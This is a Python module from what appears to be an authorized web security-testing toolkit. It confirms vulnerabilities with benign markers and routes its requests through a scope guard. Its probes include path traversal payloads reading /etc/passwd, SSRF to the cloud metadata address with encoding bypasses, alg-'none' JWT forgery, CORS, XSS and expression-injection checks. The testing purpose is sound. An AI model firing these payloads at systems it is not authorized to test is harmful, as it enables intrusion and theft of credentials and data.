#!/usr/bin/env python3
"""
probe.py — turn static hotspots into runtime-confirmed PoCs with benign payloads.

Exposes probe *primitives* the agents call, plus a --selftest plan that proves them against
the bundled fixtures. Every payload is a benign proof-of-concept marker — no destructive
actions, ever. AUTHORIZED TARGETS ONLY: an instance you launched yourself, or a live host a
validated scope.yml authorizes (see dynamic/scope.py — every request here goes through it).

  python dynamic/probe.py --launch work/_selftest/py_app --selftest
  python dynamic/probe.py --url http://127.0.0.1:8011 --selftest

Primitives (importable):
  path_traversal, ssrf, missing_auth, cors, jwt_forgery, error_disclosure, xss, expr_injection
"""
from __future__ import annotations

import argparse
import http.server
import json
import socket
import sys
import threading
import time
from dataclasses import dataclass, field, asdict
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(Path(__file__).resolve().parent))
sys.path.insert(0, str(ROOT / "static"))
# The scope guard, not bare `requests`. With no scope active this IS bare requests; with one it
# enforces the host/method/rate authorization and transcribes every exchange.
from scope import http as requests  # noqa: E402
from instrument import TargetProcess, free_port  # noqa: E402
import _common as C  # noqa: E402

TIMEOUT = 8
TRAVERSAL_PAYLOADS = ["../../../../../../etc/passwd", r"..\..\..\..\..\..\windows\win.ini",
                      "....//....//....//etc/passwd", "/etc/passwd"]
SSRF_BYPASS = [  # classic + guard-bypass variants
    "http://169.254.169.254/latest/meta-data/",
    "http://[::ffff:169.254.169.254]/",           # IPv6-mapped
    "http://2852039166/",                          # decimal IP for 169.254.169.254
    "http://0x9c/",                                # hex
]


@dataclass
class ProbeResult:
    name: str
    confirmed: bool
    endpoint: str = ""
    payload: str = ""
    status: int = 0
    detail: str = ""
    evidence: dict = field(default_factory=dict)


# --------------------------------------------------------------- SSRF callback listener ---
class _Sink(http.server.BaseHTTPRequestHandler):
    hits: list[str] = []

    def do_GET(self):  # noqa: N802
        _Sink.hits.append(self.path)
        self.send_response(200); self.end_headers(); self.wfile.write(b"ok")

    def log_message(self, *a):  # silence
        return


def _start_sink() -> tuple[str, threading.Thread, http.server.HTTPServer]:
    port = free_port()
    srv = http.server.HTTPServer(("127.0.0.1", port), _Sink)
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    return f"http://127.0.0.1:{port}/ping-{int(time.time())}", t, srv


# ------------------------------------------------------------------------- primitives ---
def path_traversal(base: str, endpoint: str, param: str = "path",
                   extra_payloads: list[str] | None = None,
                   markers: tuple[str, ...] = ("root:x:", "for 16-bit app support",
                                               "[extensions]")) -> ProbeResult:
    payloads = (extra_payloads or []) + TRAVERSAL_PAYLOADS
    for p in payloads:
        try:
            r = requests.get(f"{base}{endpoint}", params={param: p}, timeout=TIMEOUT)
        except requests.RequestException:
            continue
        if r.status_code == 200 and any(m.lower() in r.text.lower() for m in markers):
            return ProbeResult("path_traversal", True, endpoint, p, r.status_code,
                               "read a file outside the web root",
                               {"snippet": r.text[:400]})
    return ProbeResult("path_traversal", False, endpoint, payloads[0])


def ssrf(base: str, endpoint: str, param: str = "url") -> ProbeResult:
    callback, _, srv = _start_sink()
    try:
        payloads = [callback] + SSRF_BYPASS
        for p in payloads:
            try:
                requests.get(f"{base}{endpoint}", params={param: p}, timeout=TIMEOUT)
            except requests.RequestException:
                pass
        time.sleep(0.5)
        hit = bool(_Sink.hits)
        return ProbeResult("ssrf", hit, endpoint, callback, 0,
                           "server fetched attacker-controlled URL" if hit else "no callback",
                           {"callbacks": list(_Sink.hits)})
    finally:
        srv.shutdown(); _Sink.hits = []


def missing_auth(base: str, endpoint: str, sensitive_markers=("api_key", "secret", "admin")) -> ProbeResult:
    try:
        r = requests.get(f"{base}{endpoint}", timeout=TIMEOUT)
    except requests.RequestException as e:
        return ProbeResult("missing_auth", False, endpoint, detail=str(e))
    leaked = r.status_code == 200 and any(m in r.text.lower() for m in sensitive_markers)
    return ProbeResult("missing_auth", leaked, endpoint, "(no token)", r.status_code,
                       "sensitive endpoint served without authentication" if leaked else "",
                       {"snippet": r.text[:300]})


def cors(base: str, endpoint: str = "/", evil="https://evil.example") -> ProbeResult:
    try:
        r = requests.get(f"{base}{endpoint}", headers={"Origin": evil}, timeout=TIMEOUT)
    except requests.RequestException as e:
        return ProbeResult("cors", False, endpoint, detail=str(e))
    acao = r.headers.get("Access-Control-Allow-Origin", "")
    acac = r.headers.get("Access-Control-Allow-Credentials", "")
    bad = acac.lower() == "true" and (acao == evil or acao == "*")
    return ProbeResult("cors", bad, endpoint, evil, r.status_code,
                       "reflected evil Origin with credentials" if bad else "",
                       {"ACAO": acao, "ACAC": acac})


def jwt_forgery(base: str, endpoint: str, secret: str | None = None,
                marker="pwned-subject") -> ProbeResult:
    import jwt as pyjwt
    tokens = {"alg_none": pyjwt.encode({"sub": marker}, key="", algorithm="none")}
    if secret:
        tokens["hardcoded_secret"] = pyjwt.encode({"sub": marker}, secret, algorithm="HS256")
    for kind, tok in tokens.items():
        try:
            r = requests.get(f"{base}{endpoint}", headers={"Authorization": f"Bearer {tok}"},
                             timeout=TIMEOUT)
        except requests.RequestException:
            continue
        if r.status_code == 200 and marker in r.text:
            return ProbeResult("jwt_forgery", True, endpoint, kind, r.status_code,
                               f"forged {kind} token accepted -> identity spoofed",
                               {"snippet": r.text[:200]})
    return ProbeResult("jwt_forgery", False, endpoint, "alg_none/hardcoded")


def error_disclosure(base: str, endpoint: str, param: str = "path",
                     bad_value="nonexistent_probe_dir_9c2f/zzz") -> ProbeResult:
    try:
        r = requests.get(f"{base}{endpoint}", params={param: bad_value}, timeout=TIMEOUT)
    except requests.RequestException as e:
        return ProbeResult("error_disclosure", False, endpoint, detail=str(e))
    markers = ("traceback", "stack", ".py\"", "at object", "errno", "no such file",
               "exception", "/usr/", "c:\\\\")
    leaked = any(m in r.text.lower() for m in markers) and r.status_code >= 400
    return ProbeResult("error_disclosure", leaked, endpoint, repr(bad_value), r.status_code,
                       "internal error details leaked to client" if leaked else "",
                       {"snippet": r.text[:300]})


def xss(base: str, endpoint: str, param: str = "name") -> ProbeResult:
    marker = "<xss-probe-9c2f>"
    try:
        r = requests.get(f"{base}{endpoint}", params={param: marker}, timeout=TIMEOUT)
    except requests.RequestException as e:
        return ProbeResult("xss", False, endpoint, detail=str(e))
    reflected = marker in r.text  # unescaped reflection
    ct = r.headers.get("Content-Type", "")
    confirmed = reflected and "html" in ct
    return ProbeResult("xss", confirmed, endpoint, marker, r.status_code,
                       "unescaped marker reflected into HTML" if confirmed else "",
                       {"content_type": ct})


def expr_injection(base: str, endpoint: str, param: str = "expr") -> ProbeResult:
    # benign arithmetic marker: 7*7 == 49 proves evaluation
    try:
        r = requests.get(f"{base}{endpoint}", params={param: "7*7"}, timeout=TIMEOUT)
    except requests.RequestException as e:
        return ProbeResult("expr_injection", False, endpoint, detail=str(e))
    confirmed = "49" in r.text
    return ProbeResult("expr_injection", confirmed, endpoint, "7*7", r.status_code,
                       "expression evaluated server-side (7*7 -> 49)" if confirmed else "",
                       {"snippet": r.text[:200]})


# ------------------------------------------------------------------ primitive dispatch ---
# Maps --primitive names to callables so an agent can point ONE primitive at a REAL
# target endpoint from the CLI (previously only the hardcoded fixture plan was reachable).
_LEGACY = {
    "path_traversal": path_traversal, "ssrf": ssrf, "missing_auth": missing_auth,
    "cors": cors, "jwt_forgery": jwt_forgery, "error_disclosure": error_disclosure,
    "xss": xss, "expr_injection": expr_injection,
}
# default request param per primitive (used when --param is omitted)
_DEFAULT_PARAM = {"path_traversal": "path", "ssrf": "url", "error_disclosure": "path",
                  "xss": "name", "expr_injection": "expr"}

# The live-website primitives live in dynamic/primitives/ (one module per matrix group) so this
# file stays the dispatch + CLI. The legacy eight are merged in unchanged — same names, same
# signatures, same selftest_plan behaviour.
try:
    import primitives as _P
    PRIMITIVES = {**_LEGACY, **_P.REGISTRY}
    PRIMITIVE_META = dict(_P.META)
    _DEFAULT_PARAM.update({k: v["default_param"] for k, v in _P.META.items() if v["default_param"]})
except ImportError as _e:                              # the eight still work without the package
    PRIMITIVES, PRIMITIVE_META = dict(_LEGACY), {}
    print(f"warn: primitives package unavailable ({_e}); only the base 8 are loaded",
          file=sys.stderr)


def run_primitive(base: str, name: str, endpoint: str, param: str | None = None,
                  secret: str | None = None, ctx=None) -> ProbeResult:
    """Run a single named primitive against a real endpoint, threading --param/--secret/ctx
    only to the primitives whose signature accepts them."""
    import inspect
    fn = PRIMITIVES[name]
    sig = inspect.signature(fn)
    kwargs: dict = {}
    if "param" in sig.parameters:
        kwargs["param"] = param or _DEFAULT_PARAM.get(name, "path")
    if "ctx" in sig.parameters and ctx is not None:
        kwargs["ctx"] = ctx
    if name == "jwt_forgery" and secret:
        kwargs["secret"] = secret
    return fn(base, endpoint, **kwargs)


# ---------------------------------------------------------------------- self-test plan ---
def selftest_plan(base: str) -> list[ProbeResult]:
    """Known-endpoint plan for the bundled fixtures (py_app + node_app share routes)."""
    # seed a sentinel one level above the app dir so traversal is deterministic + cross-platform
    sentinel = ROOT / "work" / "_selftest" / "_TRAVERSAL_SENTINEL.txt"
    sentinel.write_text("TRAVERSAL_OK_7c2f — self-test sentinel", encoding="utf-8")
    trav_payloads = ["../_TRAVERSAL_SENTINEL.txt", "../../_selftest/_TRAVERSAL_SENTINEL.txt"]
    return [
        path_traversal(base, "/read", "path", extra_payloads=trav_payloads,
                       markers=("TRAVERSAL_OK_7c2f", "root:x:", "for 16-bit app support")),
        missing_auth(base, "/admin/secret"),
        cors(base, "/", "https://evil.example"),
        jwt_forgery(base, "/me", secret="hardcoded-self-test-secret-do-not-use"),
        error_disclosure(base, "/read", "path"),
        xss(base, "/greet", "name"),
        expr_injection(base, "/calc", "expr"),
    ]


def _write(target_hint: str, results: list[ProbeResult]) -> Path:
    d = C.workdir(target_hint) / "dynamic"
    d.mkdir(parents=True, exist_ok=True)
    out = d / "probes.json"
    out.write_text(json.dumps([asdict(r) for r in results], indent=2), encoding="utf-8")
    return out


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--url", help="probe an already-running instance")
    ap.add_argument("--launch", help="launch this target, probe, then stop")
    ap.add_argument("--entry")
    ap.add_argument("--selftest", action="store_true", help="run the fixture probe plan")
    ap.add_argument("--primitive", choices=sorted(PRIMITIVES),
                    help="run ONE primitive against --endpoint (real-target mode)")
    ap.add_argument("--endpoint", help="endpoint path for --primitive, e.g. /download")
    ap.add_argument("--param", help="request param for --primitive (per-primitive default)")
    ap.add_argument("--secret", help="known/guessed HS256 secret for --primitive jwt_forgery")
    ap.add_argument("--scope", help="scope.yml authorizing --url (see dynamic/scope.py)")
    ap.add_argument("--slug", help="workdir hint (defaults to the url/target)")
    args = ap.parse_args()

    if args.scope:
        import scope as S
        try:
            S.activate(S.Scope.load(args.scope), args.slug or args.url or args.launch or "url-target",
                       primitive=args.primitive or "")
        except S.ScopeError as e:
            print(f"scope error: {e}", file=sys.stderr)
            return 2

    def run_plan(base: str, hint: str) -> int:
        # --primitive: real-target mode (single primitive vs a real endpoint).
        # --selftest or default: the bundled fixture plan (unchanged behaviour).
        if args.primitive:
            if not args.endpoint:
                ap.error("--primitive requires --endpoint")
            results = [run_primitive(base, args.primitive, args.endpoint,
                                     args.param, args.secret)]
        else:
            results = selftest_plan(base)
        out = _write(hint, results)
        ok = sum(r.confirmed for r in results)
        print(f"\nprobed {base} -> {ok}/{len(results)} confirmed  ({out})")
        for r in results:
            mark = "CONFIRM" if r.confirmed else "  -    "
            print(f"  [{mark}] {r.name:16} {r.endpoint:14} {r.detail}")
        return 0 if ok else 1

    if args.launch:
        with TargetProcess(args.launch, entry=args.entry) as t:
            print(f"launched {t.base_url} (kind={t.kind})")
            time.sleep(1.0)
            return run_plan(t.base_url, args.launch)
    elif args.url:
        return run_plan(args.url, args.url)
    else:
        ap.error("pass --launch <target> or --url <running-instance>")


if __name__ == "__main__":
    sys.exit(main())
